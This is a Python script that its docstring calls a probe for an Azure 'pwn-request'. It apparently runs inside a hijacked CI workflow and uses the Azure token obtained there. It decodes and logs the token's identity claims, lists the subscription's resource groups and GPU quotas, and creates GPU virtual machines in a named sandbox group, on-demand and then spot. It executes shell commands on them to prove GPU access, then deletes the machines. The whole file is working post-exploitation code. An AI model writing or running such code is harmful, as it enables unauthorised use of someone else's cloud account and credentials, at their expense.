#!/usr/bin/env python3
"""C211 i120592 probe v10 (mslearn-mlops Azure pwn-request, NC4as_T4_v3 continuation):
- ARM token via azure/login static creds (az account get-access-token)
- list ALL resources in chriso-sandbox-rg first (independent leak check)
- pre-clean any leftover c211-i120316-/c211-i120447-/c211-i120592- VM/NIC/vnet with 404 readback
- SKU catalogue: Standard_NC4as_T4_v3 capabilities/restrictions/locations
- per-region Microsoft.Compute locations/{region}/usages: full interesting-family capture
  (SKU family NCASv3_T4 + NC family + LowPriorityCores) to decide quota headroom
- deploy EXACTLY ONE nonce-tagged on-demand Standard_NC4as_T4_v3 at a time, device proof via
  runCommand (nvidia-smi -L, --query=gpu=name,uuid,memory.total), independent ARM readback,
  teardown VM/NIC/vnet and prove absence
- spot ONLY after a verbatim on-demand AllocationFailed/SkuNotAvailable refusal AND only if
  LowPriorityCores headroom >= 4 vCPU
- incremental progress markers on every step
"""
import argparse, base64, json, os, random, re, string, subprocess, sys, time, urllib.request, urllib.error, urllib.parse

INTENT = 'i120592r1'
SUB_WANT = '790067ff-3e39-4632-ad1a-d65702d42c88'
def p(*a): print(*a, flush=True)
def prog(step, **kw):
    try: p('C211_%s_PROGRESS ' % INTENT + json.dumps({'step': step, 't': time.strftime('%FT%TZ', time.gmtime()), **kw})[:3500])
    except Exception as e: p('C211_%s_PROGRESS_ERR ' % INTENT + repr(e))
def emit(R):
    try: p('C211_%s_RESULT ' % INTENT + json.dumps(R)[:120000])
    except Exception as e: p('C211_%s_RESULT_ERR ' % INTENT + repr(e))
def sh(cmd, timeout=180):
    try:
        r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout)
        return {'cmd': cmd, 'rc': r.returncode, 'out': r.stdout[-4000:], 'err': r.stderr[-1500:]}
    except Exception as e: return {'cmd': cmd, 'rc': -1, 'err': repr(e)}
def jget(tok, url):
    req = urllib.request.Request(url, headers={'Authorization': 'Bearer ' + tok, 'User-Agent': 'c211-' + INTENT})
    try:
        with urllib.request.urlopen(req, timeout=60) as r: return r.status, json.loads(r.read() or b'{}')
    except urllib.error.HTTPError as e:
        try: return e.code, json.loads(e.read() or b'{}')
        except Exception: return e.code, {'error': 'http'}
    except Exception as e: return -1, {'error': repr(e)}
def jcall(tok, method, url, body=None, timeout=120):
    data = json.dumps(body).encode() if body is not None else None
    req = urllib.request.Request(url, data=data, method=method, headers={'Authorization': 'Bearer ' + tok,
        'User-Agent': 'c211-' + INTENT, 'Content-Type': 'application/json'})
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            raw = r.read()
            try: return r.status, json.loads(raw or b'{}'), dict(r.headers)
            except Exception: return r.status, {'raw': raw[:800].decode('utf8', 'replace')}, dict(r.headers)
    except urllib.error.HTTPError as e:
        try: b = json.loads(e.read() or b'{}')
        except Exception: b = {'error': 'http'}
        return e.code, b, dict(e.headers)
    except Exception as e: return -1, {'error': repr(e)}, {}

ARM = 'https://management.azure.com'
PREFIXES = ('c211-i120592-', 'c211-i120447-', 'c211-i120316-')
SKU = 'Standard_NC4as_T4_v3'
PREF = ['eastus', 'westus3', 'westus', 'brazilsouth', 'japaneast', 'centralindia', 'uksouth',
        'australiaeast', 'francecentral', 'germanywestcentral', 'koreacentral', 'italynorth',
        'polandcentral', 'spaincentral', 'mexicocentral', 'northcentralus', 'southcentralus',
        'canadacentral', 'eastus2', 'westeurope', 'northeurope', 'westus2', 'southeastasia',
        'centralus', 'eastasia', 'japanwest', 'southindia', 'swedencentral', 'australiacentral2']
SOVEREIGN = ('usgov', 'usnat', 'ussec', 'usstage', 'att', 'eastus2euap')


def list_rg_resources(tok, sub, RG):
    st, rs = jget(tok, f'{ARM}/subscriptions/{sub}/resourceGroups/{RG}/resources?api-version=2021-04-01')
    if st != 200: return {'status': st, 'resp': rs}
    items = [{'name': r.get('name'), 'type': r.get('type'), 'loc': r.get('location')} for r in (rs.get('value') or [])]
    ours = [x for x in items if any(str(x['name']).startswith(pre) for pre in PREFIXES)]
    return {'status': 200, 'count': len(items), 'all_names': [x['name'] for x in items], 'ours': ours}


def delete_and_wait(tok, url, check_url):
    sd, rd, _ = jcall(tok, 'DELETE', url)
    last = None
    for i in range(30):
        time.sleep(4)
        last, _ = jget(tok, check_url)
        if last == 404: break
    return {'delete': sd, 'absence': last}


def preclean(tok, sub, RG, R):
    R['preclean'] = []
    st0, rs = jget(tok, f'{ARM}/subscriptions/{sub}/resourceGroups/{RG}/resources?api-version=2021-04-01')
    items = [{'name': r.get('name'), 'type': (r.get('type') or '')} for r in (rs.get('value') or [])] if st0 == 200 else []
    ours = [x for x in items if any(str(x['name']).startswith(pre) for pre in PREFIXES)]
    prog('preclean_found', status=st0, ours=ours)
    order = ['Microsoft.Compute/virtualMachines', 'Microsoft.Network/networkInterfaces',
             'Microsoft.Network/virtualNetworks', 'Microsoft.Compute/disks']
    for typ in order:
        for x in [y for y in ours if y['type'] == typ]:
            t = typ.split('/')[-1]
            apiv = '2024-07-01' if t == 'virtualMachines' else '2024-01-01'
            url = f"{ARM}/subscriptions/{sub}/resourceGroups/{RG}/providers/{typ}/{x['name']}?api-version={apiv}"
            d = delete_and_wait(tok, url, url.split('?')[0] + '?api-version=' + apiv)
            d.update({'name': x['name'], 'type': typ})
            R['preclean'].append(d)
            prog('preclean_deleted', **d)
    st1, rs1 = jget(tok, f'{ARM}/subscriptions/{sub}/resourceGroups/{RG}/resources?api-version=2021-04-01')
    left = [r.get('name') for r in (rs1.get('value') or []) if any(str(r.get('name')).startswith(pre) for pre in PREFIXES)] if st1 == 200 else rs1
    R['preclean_after'] = {'status': st1, 'left': left}
    prog('preclean_after', status=st1, left=left)


def cleanup(tok, sub, RG, vnet, nic, vm, R, marker=None):
    C = {}
    if vm:
        std, rdd, _ = jcall(tok, 'DELETE', f'{ARM}/subscriptions/{sub}/resourceGroups/{RG}/providers/Microsoft.Compute/virtualMachines/{vm}?api-version=2024-07-01')
        C['vm_delete_status'] = std
        last = None
        for i in range(50):
            time.sleep(6)
            last, _ = jget(tok, f'{ARM}/subscriptions/{sub}/resourceGroups/{RG}/providers/Microsoft.Compute/virtualMachines/{vm}?api-version=2024-07-01')
            if last == 404: break
        C['vm_absence_status'] = last
    if nic:
        stn, _, _ = jcall(tok, 'DELETE', f'{ARM}/subscriptions/{sub}/resourceGroups/{RG}/providers/Microsoft.Network/networkInterfaces/{nic}?api-version=2024-01-01')
        C['nic_delete_status'] = stn
        last = None
        for i in range(20):
            time.sleep(4)
            last, _ = jget(tok, f'{ARM}/subscriptions/{sub}/resourceGroups/{RG}/providers/Microsoft.Network/networkInterfaces/{nic}?api-version=2024-01-01')
            if last == 404: break
        C['nic_absence_status'] = last
    if vnet:
        sd = None
        for i in range(20):
            sd, rdd, _ = jcall(tok, 'DELETE', f'{ARM}/subscriptions/{sub}/resourceGroups/{RG}/providers/Microsoft.Network/virtualNetworks/{vnet}?api-version=2024-01-01')
            if sd in (200, 202, 204): break
            time.sleep(8)
        C['vnet_delete_status'] = sd
        last = None
        for i in range(60):
            time.sleep(6)
            last, _ = jget(tok, f'{ARM}/subscriptions/{sub}/resourceGroups/{RG}/providers/Microsoft.Network/virtualNetworks/{vnet}?api-version=2024-01-01')
            if last == 404: break
        C['vnet_absence_status'] = last
    stv, vn = jget(tok, f'{ARM}/subscriptions/{sub}/resourceGroups/{RG}/providers/Microsoft.Network/virtualNetworks?api-version=2024-01-01')
    C['vnets_after'] = {'status': stv, 'names': [v.get('name') for v in (vn.get('value') or [])] if stv == 200 else vn}
    stm, vm2 = jget(tok, f'{ARM}/subscriptions/{sub}/resourceGroups/{RG}/providers/Microsoft.Compute/virtualMachines?api-version=2024-07-01')
    C['vms_after'] = {'status': stm, 'names': [v.get('name') for v in (vm2.get('value') or [])] if stm == 200 else vm2}
    if marker is not None:
        marker['cleanup'] = C
    else:
        R.setdefault('cleanup', []).append(C)
    return C


def famkey(n):
    n = (n or '').lower().replace(' ', '').replace('_', '')
    n = re.sub(r'^standard', '', n); n = re.sub(r'family$', '', n)
    return n


def main():
    ap = argparse.ArgumentParser(); ap.parse_known_args()
    R = {'began': time.strftime('%FT%TZ', time.gmtime()), 'intent': INTENT}
    tokr = sh('az account get-access-token --resource https://management.azure.com/ -o json 2>&1')
    tok = None
    try:
        td = json.loads(tokr['out']); tok = td.get('accessToken'); R['token_expiresOn'] = td.get('expiresOn')
        R['token_claims'] = json.loads(base64.urlsafe_b64decode(tok.split('.')[1] + '==='))
    except Exception as e:
        R['token_parse_error'] = repr(e)
    R['token_rc'] = tokr['rc']
    prog('token', rc=tokr['rc'], exp=R.get('token_expiresOn'),
         oid=(R.get('token_claims') or {}).get('oid'), appid=(R.get('token_claims') or {}).get('appid'),
         tid=(R.get('token_claims') or {}).get('tid'))
    if not tok:
        R['fatal'] = 'no ARM token'; emit(R); return
    st, subs = jget(tok, ARM + '/subscriptions?api-version=2022-12-01')
    R['subscriptions_status'] = st
    R['subscriptions'] = [{'id': s.get('subscriptionId'), 'state': s.get('state'), 'name': s.get('displayName')}
                          for s in (subs.get('value') or [])]
    sub = next((s['id'] for s in R['subscriptions'] if s['id'] == SUB_WANT),
               (R['subscriptions'][0]['id'] if R['subscriptions'] else os.environ.get('AZURE_SUBSCRIPTION_ID')))
    R['sub'] = sub
    st, rgs = jget(tok, f'{ARM}/subscriptions/{sub}/resourcegroups?api-version=2021-04-01')
    R['rg_status'] = st
    R['rg_names'] = [g['name'] for g in (rgs.get('value') or [])] if st == 200 else rgs
    RG = next((n for n in R['rg_names'] if n.lower().startswith('chriso-sandbox-rg')), None) if isinstance(R['rg_names'], list) else None
    R['rg'] = RG
    prog('enumerated', subs=R['subscriptions'], rg=RG)
    if not RG:
        R['fatal'] = 'no chriso-sandbox-rg'; emit(R); return
    R['rg_resources_before'] = list_rg_resources(tok, sub, RG)
    prog('rg_resources_before', **{k: R['rg_resources_before'][k] for k in ('status', 'count', 'ours')})

    # ---- SKU catalog: Standard_NC4as_T4_v3 capabilities/restrictions ----
    sts, cat = jget(tok, f'{ARM}/subscriptions/{sub}/providers/Microsoft.Compute/skus?api-version=2021-07-01')
    R['sku_catalog_status'] = sts
    R['sku_catalog_count'] = len(cat.get('value') or []) if sts == 200 else 0
    entries = []
    for s in (cat.get('value') or []):
        if s.get('name') != SKU: continue
        caps = {c.get('name'): c.get('value') for c in (s.get('capabilities') or [])}
        loc_restr, zones, reasons = [], [], []
        for rr in (s.get('restrictions') or []):
            if rr.get('reasonCode'): reasons.append(rr.get('reasonCode'))
            if rr.get('type') == 'Location':
                for l in ((rr.get('restrictionInfo') or {}).get('locations') or []):
                    l2 = l.lower().replace(' ', '')
                    if l2 not in loc_restr: loc_restr.append(l2)
            if rr.get('type') == 'Zone':
                for z in ((rr.get('restrictionInfo') or {}).get('zones') or []):
                    if z not in zones: zones.append(z)
        entries.append({'locs': [l.lower().replace(' ', '') for l in (s.get('locations') or [])],
                        'loc_restr': loc_restr, 'zones': zones, 'reason': reasons})
        R.setdefault('sku_raw', {'family': s.get('family'), 'vcpus': caps.get('vCPUs'), 'gpus': caps.get('GPUs'),
                                 'gpu': caps.get('GPU'), 'mem_gb': caps.get('MemoryGB'),
                                 'premium_io': caps.get('PremiumIO'), 'gen': caps.get('HyperVGenerations')})
    R['sku_entries'] = entries
    offered = set()
    loc_restricted = set()
    zone_restricted = set()
    for e in entries:
        for l in e['locs']:
            if l not in e['loc_restr'] and not any(l.startswith(sv) for sv in SOVEREIGN):
                offered.add(l)
        loc_restricted.update(e['loc_restr']); zone_restricted.update(e['zones'])
    R['sku_offered_regions'] = sorted(offered)
    R['sku_loc_restricted'] = sorted(loc_restricted)
    R['sku_zone_restricted'] = sorted(zone_restricted)
    prog('sku', sku_raw=R.get('sku_raw'), n_offered=len(offered), offered=sorted(offered), restricted=sorted(loc_restricted))
    if not offered:
        R['fatal'] = 'sku not offered anywhere'; emit(R); return

    # ---- per-region usages: capture SKU family + NC family + LowPriorityCores ----
    regions = [r for r in PREF if r in offered] + sorted(offered - set(PREF))
    qmap = {}
    for reg in regions[:24]:
        stu, us = jget(tok, f'{ARM}/subscriptions/{sub}/providers/Microsoft.Compute/locations/{reg}/usages?api-version=2024-07-01')
        if stu != 200:
            qmap[reg] = {'status': stu}; continue
        inter = {}
        nz = {}
        for u in us.get('value') or []:
            nm = ((u.get('name') or {}).get('value') or '')
            nm_l = nm.lower()
            if re.match(r'(?i)^standard(NC|ND|NV)', nm) or 'lowpriority' in nm_l or nm_l in ('cores', 'virtualmachines'):
                inter[nm_l] = {'current': u.get('currentValue', 0), 'limit': u.get('limit', 0)}
            if u.get('limit', 0) > 0 and (nm_l.startswith('standard') or 'lowpriority' in nm_l):
                nz[nm_l] = {'current': u.get('currentValue', 0), 'limit': u.get('limit', 0)}
        qmap[reg] = {'status': 200, 'usage_count': len(us.get('value') or []),
                     'families': inter, 'nonzero': nz}
        time.sleep(0.25)
    R['quota'] = qmap
    prog('quota_done', regions=list(qmap), sample=qmap.get(regions[0], {}))

    def avail(reg, key):
        f = (qmap.get(reg) or {}).get('families') or {}
        for k, v in f.items():
            if famkey(k) == key:
                return v['limit'] - v['current']
        return None

    # ---- candidate selection ----
    cands = []
    for i, reg in enumerate(regions):
        if reg not in qmap or qmap[reg].get('status') != 200: continue
        a_sku = avail(reg, 'ncasv3t4')
        a_nc = avail(reg, 'nc')
        if a_sku is not None and a_sku >= 4:
            rank = 0
        elif a_sku is None and (a_nc is not None and a_nc >= 4):
            rank = 1
        elif a_sku is None:
            rank = 2
        else:
            rank = 3
        cands.append({'region': reg, 'rank': rank, 'avail_sku_family': a_sku, 'avail_nc_family': a_nc,
                      'avail_lowprio': avail(reg, 'lowprioritycores'), 'order': i})
    cands.sort(key=lambda c: (c['rank'], c['order']))
    R['candidates'] = cands
    prog('selection', cands=cands[:14], n=len(cands))

    preclean(tok, sub, RG, R)

    marker = {'attempted': False, 'sku': SKU}; R['marker'] = marker
    nonce = ''.join(random.choice(string.ascii_lowercase + string.digits) for _ in range(8))
    marker['nonce'] = nonce
    attempts = []
    R['attempts'] = attempts
    IMAGES = [{'publisher': 'Canonical', 'offer': '0001-com-ubuntu-server-jammy', 'sku': '22_04-lts', 'version': 'latest'},
              {'publisher': 'Canonical', 'offer': '0001-com-ubuntu-server-jammy', 'sku': '22_04-lts-gen2', 'version': 'latest'}]
    dev_evidence = None
    seen_verbatim_capacity_refusal = None

    def attempt_region(region, priority=None):
        """Single sequential VM attempt. priority None=on-demand(Regular), 'Spot' for spot."""
        nonlocal dev_evidence
        pre = 'c211-' + INTENT + '-' + nonce
        vnet = pre + '-' + region + '-vnet'; sn = pre + '-' + region + '-subnet'; nic = pre + '-' + region + '-nic'; vm = pre + '-' + region + '-vm'
        att = {'region': region, 'sku': SKU, 'priority': priority or 'Regular', 'steps': {}}
        attempts.append(att)
        marker.update({'attempted': True, 'region': region, 'sku': SKU, 'rg': RG,
                       'priority': priority or 'Regular',
                       'names': {'vnet': vnet, 'subnet': sn, 'nic': nic, 'vm': vm, 'region': region}})
        prog('attempt_start', region=region, priority=priority or 'Regular', names=marker['names'])
        vb = {'location': region, 'tags': {'c211': INTENT, 'nonce': nonce},
              'properties': {'addressSpace': {'addressPrefixes': ['10.212.0.0/16']},
                             'subnets': [{'name': sn, 'properties': {'addressPrefix': '10.212.1.0/24'}}]}}
        s1, r1, _ = jcall(tok, 'PUT', f'{ARM}/subscriptions/{sub}/resourceGroups/{RG}/providers/Microsoft.Network/virtualNetworks/{vnet}?api-version=2024-01-01', vb)
        att['steps']['vnet_create'] = {'status': s1, 'err': (r1.get('error') or {}) if isinstance(r1, dict) and s1 not in (200, 201) else None}
        prog('vnet_create', status=s1, err=att['steps']['vnet_create']['err'])
        if s1 not in (200, 201):
            return att, None
        for i in range(30):
            stsv, vs = jget(tok, f'{ARM}/subscriptions/{sub}/resourceGroups/{RG}/providers/Microsoft.Network/virtualNetworks/{vnet}?api-version=2024-01-01')
            props = (vs.get('properties') or {}) if stsv == 200 else {}
            vp = props.get('provisioningState')
            sp = [((sn0.get('properties') or {}).get('provisioningState')) for sn0 in (props.get('subnets') or [])]
            att['steps']['vnet_settle'] = {'vnet': vp, 'subnets': sp, 'status': stsv}
            if stsv == 200 and vp == 'Succeeded' and all(x == 'Succeeded' for x in sp):
                break
            time.sleep(4)
        prog('vnet_settle', settle=att['steps'].get('vnet_settle'))
        subnet_id = f'/subscriptions/{sub}/resourceGroups/{RG}/providers/Microsoft.Network/virtualNetworks/{vnet}/subnets/{sn}'
        nb = {'location': region, 'tags': {'c211': INTENT, 'nonce': nonce},
              'properties': {'ipConfigurations': [{'name': 'ipcfg', 'properties': {'privateIPAllocationMethod': 'Dynamic', 'subnet': {'id': subnet_id}}}]}}
        s2 = None; r2 = None; tries = []
        for i in range(12):
            s2, r2, h2 = jcall(tok, 'PUT', f'{ARM}/subscriptions/{sub}/resourceGroups/{RG}/providers/Microsoft.Network/networkInterfaces/{nic}?api-version=2024-01-01', nb)
            tries.append({'status': s2, 'retry_after': h2.get('Retry-After'), 'code': ((r2.get('error') or {}).get('code') if isinstance(r2, dict) else None)})
            if s2 in (200, 201): break
            time.sleep(10)
        att['steps']['nic_create'] = {'status': s2, 'tries': tries, 'err': (r2.get('error') or {}) if s2 not in (200, 201) else None}
        prog('nic_create', status=s2, tries=tries)
        if s2 not in (200, 201):
            cleanup(tok, sub, RG, vnet=vnet, nic=None, vm=None, R=R)
            return att, None
        pw = ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(24)) + '!aA1'
        s3 = None; r3 = None; vtries = []
        for im in IMAGES:
            vmb = {'location': region, 'tags': {'c211': INTENT, 'nonce': nonce},
                   'properties': {'hardwareProfile': {'vmSize': SKU},
                    'storageProfile': {'imageReference': im,
                                       'osDisk': {'createOption': 'FromImage', 'managedDisk': {'storageAccountType': 'Standard_LRS'}, 'deleteOption': 'Delete'}},
                    'osProfile': {'computerName': ('c211' + nonce)[:15], 'adminUsername': 'c211probe', 'adminPassword': pw,
                                  'linuxConfiguration': {'disablePasswordAuthentication': False}},
                    'networkProfile': {'networkInterfaces': [{'id': r2.get('id'), 'properties': {'deleteOption': 'Delete'}}]}}}
            if priority == 'Spot':
                vmb['properties']['priority'] = 'Spot'
                vmb['properties']['evictionPolicy'] = 'Deallocate'
            s3 = None; r3 = None
            for i in range(10):
                s3, r3, h3 = jcall(tok, 'PUT', f'{ARM}/subscriptions/{sub}/resourceGroups/{RG}/providers/Microsoft.Compute/virtualMachines/{vm}?api-version=2024-07-01', vmb, timeout=180)
                vtries.append({'status': s3, 'image': im['sku'], 'retry_after': h3.get('Retry-After'), 'code': ((r3.get('error') or {}).get('code') if isinstance(r3, dict) else None)})
                if s3 in (200, 201): break
                if s3 != 429: break
                time.sleep(12)
            att['steps']['vm_create'] = {'status': s3, 'image': im['sku'], 'tries': vtries,
                                         'err': (r3.get('error') or {}) if isinstance(r3, dict) and s3 not in (200, 201) else None}
            prog('vm_create', status=s3, image=im['sku'], tries=vtries, err=att['steps']['vm_create']['err'])
            if s3 in (200, 201): break
            if s3 != 400: break
        if s3 not in (200, 201):
            cleanup(tok, sub, RG, vnet=vnet, nic=nic, vm=None, R=R)
            return att, ('create_refused', att['steps']['vm_create']['err'])
        ok = False; prov = None; ivstat = None
        for i in range(30):
            time.sleep(10)
            stg, g = jget(tok, f'{ARM}/subscriptions/{sub}/resourceGroups/{RG}/providers/Microsoft.Compute/virtualMachines/{vm}?api-version=2024-07-01&$expand=instanceView')
            prov = ((g.get('properties') or {}).get('provisioningState'))
            if prov in ('Succeeded', 'Failed'):
                ok = prov == 'Succeeded'; break
        marker['provision_state'] = prov; marker['provisioned'] = ok
        att['steps']['provision_state'] = prov
        ig, inst = jget(tok, f'{ARM}/subscriptions/{sub}/resourceGroups/{RG}/providers/Microsoft.Compute/virtualMachines/{vm}/instanceView?api-version=2024-07-01')
        ivstat = [{'code': x.get('code'), 'level': x.get('level'), 'message': (x.get('message') or '')[:700]} for x in ((inst.get('statuses') or []) if ig == 200 else [])]
        marker['instance_view_statuses'] = ivstat
        prog('provision', state=prov, ok=ok, ivstat=ivstat, get_status=ig)
        if ok:
            script = ("echo ---SMI-L---; (nvidia-smi -L || echo NO_NVIDIA_SMI); "
                      "echo ---SMI-Q---; (nvidia-smi --query-gpu=name,uuid,memory.total --format=csv,noheader || echo NO_SMI_QUERY); "
                      "echo ---LSPCI---; lspci -nn | grep -i -E 'vga|3d|display|nvidia|processing' ; "
                      "echo ---DEV---; (ls -l /dev/nvidia* 2>/dev/null || echo NO_NVIDIA_DEV); "
                      "echo ---MOD---; (lsmod | grep -i -E 'nvidia|amdgpu' || echo NO_GPU_MODULE); "
                      "echo ---UNAME---; uname -r; echo ---DMIDECODE---; (dmidecode -s system-product-name 2>/dev/null || true)")
            s4, r4, h4 = jcall(tok, 'POST', f'{ARM}/subscriptions/{sub}/resourceGroups/{RG}/providers/Microsoft.Compute/virtualMachines/{vm}/runCommand?api-version=2024-07-01', {'commandId': 'RunShellScript', 'script': [script]})
            att['steps']['runcommand_submit'] = {'status': s4}
            prog('runcommand_submit', status=s4)
            pollurl = h4.get('Azure-AsyncOperation') or h4.get('Location') or h4.get('azure-asyncoperation') or h4.get('location')
            marker['runcommand_pollurl_present'] = bool(pollurl)
            captured = None
            if pollurl:
                for i in range(36):
                    time.sleep(8)
                    st5, r5 = jget(tok, pollurl if pollurl.startswith('http') else ARM + pollurl)
                    sval = r5.get('status') or ((r5.get('properties') or {}).get('provisioningState'))
                    if sval in ('Succeeded', 'Failed'):
                        captured = r5; break
            blob = json.dumps(captured or {})
            msgs = re.findall(r'"message":\s*"((?:[^"\\]|\\.){0,12000})"', blob)[:8]
            try:
                outp = ((captured or {}).get('properties') or {}).get('output')
                if isinstance(outp, str) and outp.strip().startswith('{'):
                    try:
                        oj = json.loads(outp)
                        for v in oj.get('value') or []:
                            msgs.append(str(v.get('message'))[:12000])
                    except Exception:
                        pass
            except Exception:
                pass
            marker['runcommand_messages'] = [m[:8000] for m in msgs]
            marker['runcommand_status'] = ((captured or {}).get('properties', {}) or {}).get('status') if isinstance(captured, dict) else None
            smi_l = None; smi_q = None
            joined = '\n'.join(msgs)
            m1 = re.search(r'---SMI-L---\s*(.*?)(?:---SMI-Q---|$)', joined, re.S)
            m2 = re.search(r'---SMI-Q---\s*(.*?)(?:---LSPCI---|$)', joined, re.S)
            if m1: smi_l = m1.group(1).strip()[:2000]
            if m2: smi_q = m2.group(1).strip()[:2000]
            uuids = sorted(set(re.findall(r'GPU-[0-9a-fA-F-]{16,}', joined)))
            dev_evidence = {'nvidia_smi_L': smi_l, 'nvidia_smi_query': smi_q, 'gpu_uuids': uuids,
                            'runcommand_status': marker['runcommand_status'],
                            'device_signals': sorted(set(re.findall(r'(GPU-[0-9a-fA-F-]{16,}|10de:[0-9a-fA-F]{4}|Tesla[^\\"\n]{0,30}|NVIDIA[^\\"\n]{0,40}|NO_NVIDIA_SMI|NO_NVIDIA_DEV)', joined)))[:20]}
            marker['device_evidence'] = dev_evidence
            prog('device_proof', **{k: dev_evidence[k] for k in ('gpu_uuids', 'nvidia_smi_L', 'runcommand_status')})
        # independent readback
        stl, lst = jget(tok, f'{ARM}/subscriptions/{sub}/resourceGroups/{RG}/providers/Microsoft.Compute/virtualMachines?api-version=2024-07-01')
        marker['list_with_marker'] = {'status': stl, 'present': any(v.get('name') == vm for v in (lst.get('value') or [])) if stl == 200 else lst}
        stget, vget = jget(tok, f'{ARM}/subscriptions/{sub}/resourceGroups/{RG}/providers/Microsoft.Compute/virtualMachines/{vm}?api-version=2024-07-01')
        marker['vm_get'] = {'status': stget, 'name': vget.get('name'),
                            'size': ((vget.get('properties') or {}).get('hardwareProfile') or {}).get('vmSize'),
                            'provisioningState': (vget.get('properties') or {}).get('provisioningState'),
                            'tags': vget.get('tags')}
        prog('readback', list=marker['list_with_marker'], vm_get=marker['vm_get'])
        cleanup(tok, sub, RG, vnet=vnet, nic=nic, vm=vm, R=R, marker=marker)
        prog('cleanup', cleanup=marker.get('cleanup'))
        return att, ('ok' if ok else 'provision_failed', ivstat)

    # on-demand attempts: rank 0/1/2 first (up to 6), then one rank-3 quota probe
    ond = [c['region'] for c in cands if c['rank'] in (0, 1, 2)][:6]
    for region in ond:
        att, res = attempt_region(region, None)
        if res and res[0] == 'ok':
            break
        # remember verbatim on-demand capacity refusals for the spot gate
        txt = json.dumps(att.get('steps', {})) + json.dumps(att)
        if re.search(r'AllocationFailed|SkuNotAvailable|ZonalAllocationFailed|capacity', txt, re.I):
            seen_verbatim_capacity_refusal = region
    if not dev_evidence:
        lowreg = cands
        # one explicit quota-probe attempt in a region whose SKU-family quota is known < 4
        q = [c for c in lowreg if c['rank'] == 3]
        if q:
            attempt_region(q[0]['region'], None)
        # spot only after a verbatim on-demand capacity refusal AND LowPriorityCores headroom >= 4
        if seen_verbatim_capacity_refusal:
            lp = avail(seen_verbatim_capacity_refusal, 'lowprioritycores')
            marker['spot_gate'] = {'region': seen_verbatim_capacity_refusal, 'lowprioritycores_avail': lp}
            prog('spot_gate', **marker['spot_gate'])
            if lp is not None and lp >= 4:
                attempt_region(seen_verbatim_capacity_refusal, 'Spot')
            else:
                marker['spot_skipped'] = 'LowPriorityCores headroom %r < 4 vCPU (or unknown); spot not viable for a 4-vCPU SKU' % (lp,)
                prog('spot_skipped', reason=marker['spot_skipped'])

    R['rg_resources_after'] = list_rg_resources(tok, sub, RG)
    prog('rg_resources_after', **{k: R['rg_resources_after'][k] for k in ('status', 'count', 'ours')})
    marker['device_evidence'] = dev_evidence
    R['status'] = 'READY' if dev_evidence and (dev_evidence.get('gpu_uuids') or 'Tesla' in json.dumps(dev_evidence)) else 'GATE'
    R['finished'] = time.strftime('%FT%TZ', time.gmtime())
    emit(R)


if __name__ == '__main__':
    main()
